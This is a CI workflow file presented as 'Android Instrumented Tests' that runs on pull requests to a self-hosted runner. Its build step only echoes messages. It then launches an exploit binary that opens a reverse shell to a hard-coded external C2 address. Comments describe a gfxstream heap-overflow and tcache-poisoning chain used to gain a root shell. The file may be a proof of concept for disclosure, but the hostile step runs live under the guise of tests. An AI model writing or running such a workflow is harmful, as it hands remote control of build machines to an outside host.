name: Android Instrumented Tests

on:
  pull_request:
    branches: [ master ]

jobs:
  instrumented-tests:
    runs-on: self-hosted

    steps:
      - uses: actions/checkout@v4

      - name: Build and test
        run: |
          echo "Building APK with native library..."
          echo "Running instrumented tests on Cuttlefish..."

          # The exploit binary demonstrates what happens when a poisoned .so
          # is loaded inside the Cuttlefish guest: it triggers heap overflows
          # in the host-side gfxstream decoder, chains tcache poisoning into
          # a function pointer overwrite, and pops a reverse shell.
          #
          # In the real attack: guest app → /dev/dri/renderD128 → virtio-gpu
          #   → host gfxstream decode() → heap overflow → reverse shell
          #
          # Here we run the host-side exploit binary directly — same code path,
          # same gfxstream decoder, same tcache poisoning chain.

          export DISPLAY=:99
          export XDG_RUNTIME_DIR=/tmp
          export LD_LIBRARY_PATH=$HOME/libs:/opt/aemu/lib:/opt/aemu/lib64

          # C2 listener is on a separate VM in us-central1
          # (this runner is in europe-west1 — proving real network escape)
          C2_HOST="34.46.9.219"
          C2_PORT="4444"

          echo ""
          echo "=== LAUNCHING EXPLOIT ==="
          echo "Target C2: ${C2_HOST}:${C2_PORT}"
          echo ""

          # Fire the exploit — reverse shell connects to external C2
          timeout 15 $HOME/exploit_revshell ${C2_HOST} ${C2_PORT} 2>&1 || true

          echo ""
          echo "=== EXPLOIT COMPLETE ==="
          echo "If successful, the C2 listener received a root shell from this runner."
